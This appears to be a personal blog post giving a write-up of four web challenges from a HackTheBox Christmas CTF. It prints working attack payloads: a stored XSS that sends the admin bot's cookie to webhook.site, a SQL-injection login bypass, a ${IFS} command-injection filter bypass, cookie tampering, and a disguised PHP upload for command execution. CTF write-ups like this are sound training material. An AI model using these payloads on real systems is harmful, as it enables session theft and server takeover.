<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>HTB Cyber Santa CTF 2021 Web Write Up</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
    <!-- highlight.js -->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
    <style>.hljs { background: none; }</style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->
    
    <!-- This tag outputs SEO meta+structured data and other important settings -->
    <meta name="description" content="Infosec | Hacking | CTF" />
    <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
    <link rel="canonical" href="https://darrynbrownfield.co.uk/htbcybersanta" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

     <!--title below is coming from _includes/dynamic_title-->
    <meta property="og:site_name" content="Darryn Brownfield" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="HTB Cyber Santa CTF 2021 Web Write Up" />
    <meta property="og:description" content="Overview This writeup is for the web challenges from the HackTheBox Cyber Santa is Coming to Town CTF that took place from Wednesday 01 December to Sunday 05 December. A big thank you to HTB for putting on a great event (as always). Check out their other CTF events at" />
    <meta property="og:url" content="https://darrynbrownfield.co.uk/htbcybersanta" />
    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/htbcybersanta/cover.png" />
    <meta property="article:publisher" content="https://www.facebook.com/" />
    <meta property="article:author" content="https://www.facebook.com/" />
    <meta property="article:published_time" content="2021-12-04T18:00:00-06:00" />
    <meta property="article:modified_time" content="2021-12-04T18:00:00-06:00" />
    <meta property="article:tag" content="Hackthebox" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="HTB Cyber Santa CTF 2021 Web Write Up" />
    <meta name="twitter:description" content="Overview This writeup is for the web challenges from the HackTheBox Cyber Santa is Coming to Town CTF that took place from Wednesday 01 December to Sunday 05 December. A big thank you to HTB for putting on a great event (as always). Check out their other CTF events at" />
    <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/htbcybersanta/cover.png" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Darryn Brownfield" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="Hackthebox" />
    <meta name="twitter:site" content="@dazbrownfield" />
    <meta name="twitter:creator" content="@dazbrownfield" />
    <meta property="og:image:width" content="1400" />
    <meta property="og:image:height" content="933" />

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "Darryn Brownfield",
        "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
    },
    "url": "https://darrynbrownfield.co.uk/htbcybersanta",
    "image": {
        "@type": "ImageObject",
        "url": "https://darrynbrownfield.co.uk/assets/images/htbcybersanta/cover.png",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://darrynbrownfield.co.uk/htbcybersanta"
    },
    "description": "Overview This writeup is for the web challenges from the HackTheBox Cyber Santa is Coming to Town CTF that took place from Wednesday 01 December to Sunday 05 December. A big thank you to HTB for putting on a great event (as always). Check out their other CTF events at"
}
    </script>

    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
    <script type="text/javascript">
    ghost.init({
    	clientId: "ghost-frontend",
    	clientSecret: "f84a07a72b17"
    });
    </script> -->

    <meta name="generator" content="Jekyll 3.6.2" />
    <link rel="alternate" type="application/rss+xml" title="HTB Cyber Santa CTF 2021 Web Write Up" href="/feed.xml" />


</head>
<body class="post-template">

    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->

<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            

            
        
        
            <ul class="nav" role="menu">
    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
    <li class="nav-getting-started" role="menuitem"><a href="/tag/review/">Reviews</a></li>
    <li class="nav-getting-started" role="menuitem"><a href="/tag/bugbounty/">Bug Bounty</a></li>
</ul>

        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
            <a
              class="social-link social-link-tw"
              href="https://github.com/darrynb89"
              target="_blank"
              rel="noopener"
              ><svg
  version="1.0"
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 120.000000 120.000000"
>
  <g
    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
    fill="#ffffff"
    stroke="none"
  >
    <path
      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
    />
  </g>
</svg></a
            >
            
            <a
              class="social-link social-link-li"
              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
              target="_blank"
              rel="noopener"
              ><svg viewBox="0 50 512 512">
    <g transform="translate(0.000000,20.000000) scale(1.1)">
      <path
        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
      />
    </g>
  </svg></a
            >
             
            <a
              class="social-link social-link-tw"
              href="https://twitter.com/dazbrownfield"
              target="_blank"
              rel="noopener"
              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a
            >
             
          </div>
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full  tag-hackthebox tag-ctf post ">

            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime=" 4 December 2021"> 4 December 2021</time>
                    
                        <span class="date-divider">/</span>
                        
                            
                               <a href='/tag/hackthebox/'>HACKTHEBOX</a>,
                            
                        
                            
                               <a href='/tag/ctf/'>CTF</a>
                            
                        
                    
                </section>
                <h1 class="post-full-title">HTB Cyber Santa CTF 2021 Web Write Up</h1>
            </header>

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <p><img src="/assets/images/htbcybersanta/cover.png" alt="cover" /></p>

<h3 id="overview">Overview</h3>

<p>This writeup is for the web challenges from the <a href="https://www.hackthebox.com">HackTheBox</a> Cyber Santa is Coming to Town CTF that took place from Wednesday 01 December to Sunday 05 December.</p>

<p>A big thank you to HTB for putting on a great event (as always). Check out their other CTF events at https://ctf.hackthebox.com.</p>

<h3 id="toy-workshop">Toy Workshop</h3>

<p>The description for this challenge was:</p>

<p>“The work is going well on Santa’s toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?”</p>

<p>The challenge had both a docker instance to active and downloadable content.</p>

<p>Taking a look at the docker instance IP we get a simple web page.</p>

<p><img src="/assets/images/htbcybersanta/workshop.gif" alt="workshop" /></p>

<p>Rather than spend time poking around the website I took a look at the code provided.</p>

<p>In the routes/index.js file provides some additional paths, ‘/api/submit’ and ‘/queries’.</p>

<pre><code class="language-highlight">router.get('/', (req, res) =&gt; {
	return res.render('index');
});

router.post('/api/submit', async (req, res) =&gt; {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() =&gt; {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});

router.get('/queries', async (req, res, next) =&gt; {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries =&gt; {
			res.render('queries', { queries });
		})
		.catch(() =&gt; res.status(500).send(response('Something went wrong!')));
});
</code></pre>

<p>Two things jump out, the first the /api/submit page requires a POST request, if its accepted it will run ‘bot.readQueries(db);’. Next the /queries page is only accessible from 127.0.0.1.</p>

<p>Taking a look at views/bot.js, the flag will be provided as a cookie and the readQueries function when called will set a cookie and call the queries page.</p>

<pre><code class="language-highlight">const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) =&gt; {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};
</code></pre>

<p>Next reviewing the views/queries.hbs page, It looks like the page iterates through the queries.</p>

<pre><code class="language-highlight">        &lt;p class="pb-3"&gt;Welcome back, admin!&lt;/p&gt;
        &lt;div class="dash-frame"&gt;
            
            &lt;p&gt;}&lt;/p&gt;
            
            &lt;p class="empty"&gt;No content&lt;/p&gt;
            
        &lt;/div&gt;
</code></pre>

<p>So putting all this together I think we can use XSS to grab the cookie by sending a XSS payload in the API submit function. The cookie (flag) will be sent and the readQueries function will call the queries page, the XSS payload will fire and give our flag.</p>

<p>First I tested sending a simple POST request using curl and got a response.</p>

<pre><code class="language-highlight">└──╼ $curl -X POST http://:/api/submit --header 'Content-Type: application/json' -d '{"query":"test"}'
{"message":"Your message is delivered successfully!"}
</code></pre>

<p>I used https://webhook.site to generate a URL I could use in the XSS payload. I then changed the payload to use a script tag to call the web hook site along with the cookie.</p>

<pre><code class="language-highlight">└──╼ $curl -X POST :/api/submit --header 'Content-Type: application/json' -d '{"query":"&gt;&lt;script&gt;window.location='\''https://webho
ok.site//?c='\''.concat(document.cookie)&lt;/script&gt;"}'
{"message":"Your message is delivered successfully!"}
</code></pre>

<p>On the webhook site was my request and the cookie.</p>

<h3 id="toy-management">Toy Management</h3>

<p>The description for Toy Management was:</p>

<p>“The evil elves have changed the admin access to Santa’s Toy Management Portal. Can you get the access back and save the Christmas?”</p>

<p>Again with both a docker instance to start and downloadable content. This time its just a login form. I tried “admin’– -“ in the username field and “admin” as the password and got in and got the flag!</p>

<p><img src="/assets/images/htbcybersanta/toymanagement.png" alt="toymanagement" /></p>

<h3 id="gadget-santa">Gadget Santa</h3>

<p>The description for Gadget Santa was:</p>

<p>“It seems that the evil elves have broken the controller gadget for the good old candy cane factory! Can you team up with the real red teamer Santa to hack back?”</p>

<p>Again this challenge had both a docker instance and downloadable content.</p>

<p>Looking at the webpage, I appears I can select options to print output from the system.</p>

<p><img src="/assets/images/htbcybersanta/gadgets.gif" alt="gadgets" /></p>

<p>The URL has a command parameter: http://:/?command=list_storage</p>

<p>So I tried some basic linux commands and I got output.</p>

<p><img src="/assets/images/htbcybersanta/commands.gif" alt="commands" /></p>

<p>However, when ever I try and use a space I get no output. I can chain commands together using <code class="highlighter-rouge">;</code> but it still fails to show an output if I use a space.</p>

<p><img src="/assets/images/htbcybersanta/listfiles.gif" alt="listfiles" /></p>

<p>Looking at the source, there is a sanitize function which removes spaces from the command.</p>

<pre><code class="language-highlight">&lt;?php
class MonitorModel
{   
    public function __construct($command)
    {
        $this-&gt;command = $this-&gt;sanitize($command);
    }

    public function sanitize($command)
    {   
        $command = preg_replace('/\s+/', '', $command);
        return $command;
    }

    public function getOutput()
    {
        return shell_exec('/santa_mon.sh '.$this-&gt;command);
    }
}
</code></pre>

<p>In a Python script shows the placeholder for the flag. The script is a web server running locally on port 3000.</p>

<pre><code class="language-highlight">def http_server(host_port,content_type="application/json"):
	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -&gt; None:
			def resp_ok():
				self.send_response(200)
				self.send_header("Content-type", content_type)
				self.end_headers()
			if self.path == '/':
				resp_ok()
				if check_service():
					self.wfile.write(get_json({'status': 'running'}))
				else:
					self.wfile.write(get_json({'status': 'not running'}))
				return
			elif self.path == '/restart':
				restart_service()
				resp_ok()
				self.wfile.write(get_json({'status': 'service restarted successfully'}))
				return
			elif self.path == '/get_flag':
				resp_ok()
				self.wfile.write(get_json({'status': 'HTB{f4k3_fl4g_f0r_t3st1ng}'}))
				return
			self.send_error(404, '404 not found')
		def log_message(self, format, *args):
			pass
	class _TCPServer(TCPServer):
		allow_reuse_address = True
	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()

http_server(('127.0.0.1',3000))
</code></pre>

<p>So I should be able to curl localhost:3000/get_flag to grab the flag. However I need to bypass the sanitization. To do this I can use <code class="highlighter-rouge">${IFS}</code>. <a href="https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions#bypass-forbidden-spaces">HackTricks</a> is a great resource for techniques like this.</p>

<p>So with the URL “http://:/?command=;curl${IFS}localhost:3000/get_flag” I get the flag!</p>

<h3 id="elf-directory">Elf Directory</h3>

<p>The description for Elf Directory was:</p>

<p>“Can you infiltrate the Elf Directory to get a foothold inside Santa’s data warehouse in the North Pole?”</p>

<p>There is no downloadable content for this challenge just a docker instance to start.</p>

<p>Going to the docker instance IP and port shows a login page, unfortunately no simple SQL bypass this time.</p>

<p><img src="/assets/images/htbcybersanta/elfdirectory.png" alt="elfdirectory" /></p>

<p>I tried some basic default credentials but had no luck so created an account with the username d4zs3c and logged in.</p>

<p><img src="/assets/images/htbcybersanta/loggedin.png" alt="loggedin" /></p>

<p>There is a message:</p>

<p>“You don’t have permission to edit your profile, contact the admin elf to approve your account!”</p>

<p>Now logged I checked the developer tools in Firefox and I have a PHPSESSID. I coped the cookie value and put it in <a href="https://gchq.github.io">CyberChef</a> and used ‘From Base64’ operation.</p>

<p><img src="/assets/images/htbcybersanta/cookie.png" alt="cookie" /></p>

<p>I removed the %3D which left with me <code class="highlighter-rouge">{"username":"d4zs3c","approved":false}</code>.</p>

<p>Next I changed the input to <code class="highlighter-rouge">{"username":"d4zs3c","approved":true}</code> and used the ‘To Base64’. Using the developer tools I removed the value up until the %3d and pasted in my new base64 string which looked like: “eyJ1c2VybmFtZSI6ImQ0enMzYyIsImFwcHJvdmVkIjp0cnVlfQ==%3D”</p>

<p>Now refreshing the page with my new cookie I get the option to upload a file.</p>

<p><img src="/assets/images/htbcybersanta/approved.png" alt="approved" /></p>

<p>I tried to upload a PHP file but got an error:</p>

<p>“Invalid image. Only PNG images are supported.”</p>

<p>So I downloaded an image of Santa (had to be) and tried to upload it but this time via Burp so I could modify it before its submitted. I appended the file name with .php and removed the contents of the file with a simple PHP script.</p>

<p><img src="/assets/images/htbcybersanta/uploadbypass.gif" alt="uploadbypass" /></p>

<p>Now all I need to do is browse to the file and I will have command execution and can read the flag.</p>

<p><img src="/assets/images/htbcybersanta/commandinjection.gif" alt="commandinjection" /></p>

<p>Thanks for reading!</p>

<p>============================================================</p>

<p>Any comments or feedback welcome! You can find me on <a href="https://twitter.com/dazbrownfield">twitter</a>.</p>

<p><a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" /></a></p>


                </div>
            </section>

            <!-- Email subscribe form at the bottom of the page -->
            

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
            </footer>

            <!-- If you use Disqus comments, just uncomment this block.
            The only thing you need to change is "test-apkdzgmqhj" - which
            should be replaced with your own Disqus site-id. -->
            

        </article>

    </div>
</main>



        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="https://darrynbrownfield.co.uk/">Darryn Brownfield</a> &copy; 2023</section>
                <nav class="site-footer-nav">
                    <a href="/">Latest Posts</a>
                 </nav>
            </div>
        </footer>

    </div>

    <!-- The big email subscribe modal content -->
    

    <!-- highlight.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script
        src="https://code.jquery.com/jquery-3.2.1.min.js"
        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->

    


    <!-- Add Google Analytics  -->
    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-175458891-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-175458891-1');
</script>



    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
            header.classList.add('floating-active');
        } else {
            header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->

</body>
</html>
